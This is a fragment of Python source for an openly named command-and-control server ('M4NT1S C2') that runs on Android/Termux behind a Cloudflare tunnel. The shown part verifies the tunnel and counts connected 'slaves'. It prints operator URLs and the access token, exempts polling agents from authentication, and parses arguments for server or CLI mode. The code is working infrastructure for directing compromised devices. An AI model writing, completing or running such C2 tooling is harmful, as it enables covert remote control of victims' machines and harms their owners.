# ---------------------------------------------------------------------------
# TUNNEL VERIFY
# ---------------------------------------------------------------------------
def verify_tunnel_async():
    time.sleep(2)
    url = f"{TUNNEL_URL}/api/v1/health"
    ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
          'AppleWebKit/537.36 (KHTML, like Gecko) '
          'Chrome/124.0.0.0 Safari/537.36')
    headers = {'User-Agent': ua}
    if C2_TOKEN:
        headers['X-C2-Token'] = C2_TOKEN
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=8) as r:
            data = json.loads(r.read())
        if data.get('status') == 'ok':
            print(f"  [TUNNEL] verified — {data.get('slaves', 0)} slaves")
            return
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(f"  [TUNNEL] 401 — token mismatch (local C2 is fine)")
        elif e.code == 403:
            print(f"  [TUNNEL] 403 — Cloudflare WAF blocked the check")
            print(f"  [TUNNEL] the agent's own polls are unaffected")
        else:
            print(f"  [TUNNEL] HTTP {e.code}")
    except Exception as e:
        print(f"  [TUNNEL] unreachable: {e}")

# ---------------------------------------------------------------------------
# SERVER MODE
# ---------------------------------------------------------------------------
def print_banner(host, port, auth_on):
    token_part = f"?token={C2_TOKEN}" if C2_TOKEN else ""
    local_url  = f"http://127.0.0.1:{port}/{token_part}"
    web_url    = f"{TUNNEL_URL}/{token_part}"

    print()
    print("  ╔══════════════════════════════════════════════════════════╗")
    print("  ║     M4NT1S C2 — Android / Termux / Cloudflare           ║")
    print("  ║                    IN-MEMORY ONLY                        ║")
    print("  ╚══════════════════════════════════════════════════════════╝")
    print(f"  Bind:       {host}:{port}")
    print(f"  Local UI:   {local_url}")
    print(f"  Public UI:  {web_url}")
    print(f"  Tunnel:     {TUNNEL_URL}")
    print(f"  Storage:    in-memory (nothing saved to disk; slaves are")
    print(f"              forgotten on restart — they self-heal on poll)")
    if auth_on:
        print(f"  Auth:       ON — operator endpoints need ?token=, agent exempt")
        print(f"  Token:      {C2_TOKEN}")
        print(f"              (set C2_TOKEN env var for a stable token across")
        print(f"               restarts; otherwise it changes each run)")
    else:
        print(f"  Auth:       OFF — EVERY ENDPOINT IS PUBLIC")
    print()
    print(f"  Agent target: {TUNNEL_URL}/api/v1")
    print()

def server_main(host, port):
    print_banner(host, port, C2_TOKEN is not None)
    threading.Thread(target=verify_tunnel_async, daemon=True).start()
    try:
        app.run(host=host, port=port, debug=False, use_reloader=False,
                threaded=True)
    except KeyboardInterrupt:
        print("\n  bye.\n")

# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main():
    global TUNNEL_HOST, TUNNEL_URL, SERVER_URL, C2_TOKEN

    p = argparse.ArgumentParser(prog='c2_android.py')
    p.add_argument('args', nargs='*')
    p.add_argument('--host', default='127.0.0.1')
    p.add_argument('--port', type=int, default=5000)
    p.add_argument('--tunnel')
    p.add_argument('--no-auth', action='store_true')
    p.add_argument('--url')
    p.add_argument('--local', action='store_true')
    ns = p.parse_args()

    if ns.tunnel:
        TUNNEL_HOST = ns.tunnel
        TUNNEL_URL  = f"https://{TUNNEL_HOST}"
        if not ns.url and not ns.local:
            SERVER_URL = TUNNEL_URL
    if ns.no_auth:
        C2_TOKEN = None
    if ns.url:
        SERVER_URL = ns.url
    elif ns.local:
        SERVER_URL = f"http://127.0.0.1:{ns.port}"

    if ns.args:
        cli_main(ns.args)
    else:
        server_main(ns.host, ns.port)

if __name__ == '__main__':
    main()